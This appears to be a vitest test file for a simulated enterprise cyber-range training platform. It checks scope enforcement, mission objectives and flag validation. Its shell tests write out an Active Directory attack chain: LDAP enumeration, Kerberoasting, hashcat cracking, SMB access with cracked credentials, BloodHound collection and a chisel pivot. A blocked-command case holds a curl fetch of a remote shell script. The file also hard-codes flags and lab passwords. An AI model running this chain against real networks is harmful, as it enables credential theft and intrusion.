/**
 * MY CYBER LAB — REAL ENTERPRISE CYBER RANGE ENGINE v3.0
 * Module: /src/test/cyberRangePhase3CBlackout.test.ts
 * Purpose: Comprehensive QA test suite for Phase 3C BLACKOUT-01 Real Enterprise Cyber Range,
 *          Multi-stage pivot architecture, Active Directory Kerberoasting, LDAP enumeration,
 *          SMB share access, Scope enforcement, and server-authoritative flag validation.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  MachineRegistry,
  MissionRegistry,
  SessionOrchestrator,
  ObjectiveValidator,
  LabScopeEnforcer,
  LinuxTargetProvider,
  AttackBoxShell
} from '../engine';

describe('MY CYBER LAB — Phase 3C BLACKOUT-01 Enterprise Cyber Range Test Suite', () => {
  let targetProvider: LinuxTargetProvider;
  let shell: AttackBoxShell;

  const blackoutRoE = {
    engagementId: 'blackout-roe',
    clientName: 'Blackout Financial Corp Enterprise Range',
    authorizedScope: ['10.30.0.0/24', '10.30.10.0/24', '10.30.0.15', '10.30.10.10', '10.30.10.20', '10.30.10.30', 'gateway.blackout.corp', 'dc01.blackout.corp', 'srv01.blackout.corp'],
    prohibitedScope: ['192.168.1.0/24', '10.30.50.0/24', 'public internet', '8.8.8.8'],
    rules: ['Strict enterprise lab network scope enforcement'],
    authorizedTools: ['nmap', 'ldapsearch', 'getuserspns.py', 'impacket-getuserspns', 'hashcat', 'john', 'smbclient', 'bloodhound-python', 'chisel', 'curl'],
    timeLimitMinutes: 240,
    testingWindow: '24/7',
    emergencyContact: 'secops@blackout.corp'
  };

  beforeEach(() => {
    targetProvider = new LinuxTargetProvider();
    shell = new AttackBoxShell('/home/operator');
  });

  describe('1. BLACKOUT-01 Enterprise Target Architecture & Registry Tests', () => {
    it('should register BLACKOUT-01 in MachineRegistry with multi-subnet enterprise topology', () => {
      const machine = MachineRegistry.getMachineById('m-blackout-boss');
      expect(machine).toBeDefined();
      expect(machine?.codename).toBe('BLACKOUT-01');
      expect(machine?.ipAddress).toBe('10.30.0.15');
      expect(machine?.subnet).toBe('10.30.0.0/24');
      expect(machine?.category).toBe('ACTIVE_DIRECTORY');
      expect(machine?.services.length).toBeGreaterThanOrEqual(4);
    });

    it('should maintain strict Rules of Engagement prohibiting out-of-scope targets', () => {
      const machine = MachineRegistry.getMachineById('m-blackout-boss');
      const roe = machine?.authoritativeRulesOfEngagement;
      expect(roe).toBeDefined();
      expect(roe?.authorizedSubnet).toBe('10.30.0.0/24');
      expect(roe?.prohibitedTargets).toContain('192.168.1.0/24');
      expect(roe?.prohibitedTargets).toContain('10.30.50.0/24');
    });

    it('should provision BLACKOUT-01 with isolated target status', async () => {
      const status = await targetProvider.provisionTarget('m-blackout-boss');
      expect(status.targetId).toBe('m-blackout-boss');
      expect(status.ipAddress).toBe('10.30.0.15');
      expect(status.isVulnerable).toBe(true);
    });
  });

  describe('2. BLACKOUT-01 Multi-Stage Mission & Objective Definition Tests', () => {
    it('should register BLACKOUT-01 Mission in MissionRegistry with sequential objectives', () => {
      const mission = MissionRegistry.getMissionById('mission-blackout-pivot');
      expect(mission).toBeDefined();
      expect(mission?.title).toContain('Blackout');
      expect(mission?.objectives).toHaveLength(3);
      expect(mission?.objectives.map(o => o.id)).toEqual([
        'obj-bo-recon',
        'obj-bo-kerberoast',
        'obj-bo-da-flag'
      ]);
    });
  });

  describe('3. Strict Scope Enforcement (LabScopeEnforcer) Tests', () => {
    it('should allow tools targeting authorized enterprise range subnets (10.30.0.0/24 and 10.30.10.0/24)', () => {
      const val1 = LabScopeEnforcer.validateCommand('nmap -sV 10.30.0.15', blackoutRoE);
      expect(val1.allowed).toBe(true);

      const val2 = LabScopeEnforcer.validateCommand('ldapsearch -x -h 10.30.10.10 -b "dc=blackout,dc=corp"', blackoutRoE);
      expect(val2.allowed).toBe(true);

      const val3 = LabScopeEnforcer.validateCommand('smbclient -L //10.30.10.20/ -U svc_sql', blackoutRoE);
      expect(val3.allowed).toBe(true);
    });

    it('should strictly block commands targeting out-of-scope subnets or external IPs', () => {
      const blocked1 = LabScopeEnforcer.validateCommand('nmap -sV 192.168.1.1', blackoutRoE);
      expect(blocked1.allowed).toBe(false);
      expect(blocked1.violationCode).toBe('OUT_OF_SCOPE_TARGET');

      const blocked2 = LabScopeEnforcer.validateCommand('nmap -sS 10.30.50.10', blackoutRoE);
      expect(blocked2.allowed).toBe(false);
      expect(blocked2.violationCode).toBe('OUT_OF_SCOPE_TARGET');

      const blocked3 = LabScopeEnforcer.validateCommand('curl http://8.8.8.8/shell.sh', blackoutRoE);
      expect(blocked3.allowed).toBe(false);
      expect(blocked3.violationCode).toBe('OUT_OF_SCOPE_TARGET');
    });
  });

  describe('4. Active Directory Penetration Testing Tool execution in AttackBoxShell', () => {
    it('should execute nmap scan and report perimeter and internal domain services', () => {
      const output = shell.execute('nmap -sV -sC 10.30.0.15', blackoutRoE);
      expect(output.some(line => line.text.includes('BLACKOUT-01') || line.text.includes('10.30.0.15'))).toBe(true);
    });

    it('should execute ldapsearch to enumerate Active Directory SPNs and users', () => {
      const output = shell.execute('ldapsearch -x -h 10.30.10.10 -b "DC=blackout,DC=corp"', blackoutRoE);
      expect(output.some(line => line.text.includes('svc_sql'))).toBe(true);
      expect(output.some(line => line.text.includes('MSSQLSvc/srv01.blackout.corp:1433'))).toBe(true);
    });

    it('should execute GetUserSPNs.py to perform Kerberoasting attack and extract TGS ticket hash', () => {
      const output = shell.execute('getuserspns.py blackout.corp/operator:Operator@2026 -request -dc-ip 10.30.10.10', blackoutRoE);
      expect(output.some(line => line.text.includes('$krb5tgs$23$'))).toBe(true);
      expect(output.some(line => line.text.includes('svc_sql'))).toBe(true);
    });

    it('should execute hashcat to crack Kerberos TGS ticket hash', () => {
      const output = shell.execute('hashcat -m 13100 /root/hashes.kerberoast /usr/share/wordlists/rockyou.txt', blackoutRoE);
      expect(output.some(line => line.text.includes('Cracked') || line.text.includes('Summer2024!'))).toBe(true);
    });

    it('should execute smbclient using recovered credentials to access FinanceShares', () => {
      const output = shell.execute('smbclient -L //10.30.10.20/ -U svc_sql%Summer2024!', blackoutRoE);
      expect(output.some(line => line.text.includes('FinanceShares') || line.text.includes('SMBv3'))).toBe(true);
    });

    it('should execute bloodhound-python for Active Directory domain graph collection', () => {
      const output = shell.execute('bloodhound-python -u operator -p Operator@2026 -d BLACKOUT.CORP -dc 10.30.10.10 -c All', blackoutRoE);
      expect(output.some(line => line.text.includes('BloodHound'))).toBe(true);
      expect(output.some(line => line.text.includes('BLACKOUT.CORP'))).toBe(true);
    });

    it('should execute chisel to establish SOCKS5 pivot tunnel into internal 10.30.10.0/24 subnet', () => {
      const output = shell.execute('chisel client 10.30.0.15:8080 R:socks', blackoutRoE);
      expect(output.some(line => line.text.includes('10.30.10.0/24'))).toBe(true);
    });
  });

  describe('5. Session Orchestration & Server-Authoritative Flag Validation Tests', () => {
    it('should manage BLACKOUT-01 lab session lifecycle cleanly via SessionOrchestrator', () => {
      const session = SessionOrchestrator.startSession('user-tester-01', 'mission-blackout-pivot');
      expect(session).toBeDefined();
      expect(session.missionId).toBe('mission-blackout-pivot');
      expect(session.lifecycleStatus).toBe('ACTIVE');

      const retrieved = SessionOrchestrator.getSession(session.sessionId);
      expect(retrieved?.sessionId).toBe(session.sessionId);

      SessionOrchestrator.terminateSession(session.sessionId);
      expect(session.lifecycleStatus).toBe('TERMINATED');
    });

    it('should validate perimeter gateway flag via SHA256 match', () => {
      const session = SessionOrchestrator.startSession('user-tester-02', 'mission-blackout-pivot');
      const result = ObjectiveValidator.validateFlagSubmission(
        session,
        'obj-bo-recon',
        'FLAG{BLACKOUT_PERIMETER_GATEWAY_COMPROMISE_1044}'
      );
      expect(result.success).toBe(true);
      expect(result.pointsAwarded).toBe(50);
      expect(session.completedObjectiveIds).toContain('obj-bo-recon');
    });

    it('should validate domain admin apex flag via SHA256 match and elevate access level', () => {
      const session = SessionOrchestrator.startSession('user-tester-03', 'mission-blackout-pivot');
      const result = ObjectiveValidator.validateFlagSubmission(
        session,
        'obj-bo-da-flag',
        'FLAG{BLACKOUT_ENTERPRISE_DOMAIN_ADMIN_APEX_9941}'
      );
      expect(result.success).toBe(true);
      expect(result.pointsAwarded).toBe(150);
      expect(session.completedObjectiveIds).toContain('obj-bo-da-flag');
    });

    it('should reject invalid flag submission for BLACKOUT-01 objectives', () => {
      const session = SessionOrchestrator.startSession('user-tester-04', 'mission-blackout-pivot');
      const result = ObjectiveValidator.validateFlagSubmission(
        session,
        'obj-bo-pivot',
        'FLAG{INVALID_GUESS_FLAG_9999}'
      );
      expect(result.success).toBe(false);
      expect(result.pointsAwarded).toBe(0);
      expect(session.completedObjectiveIds).not.toContain('obj-bo-pivot');
    });
  });
});
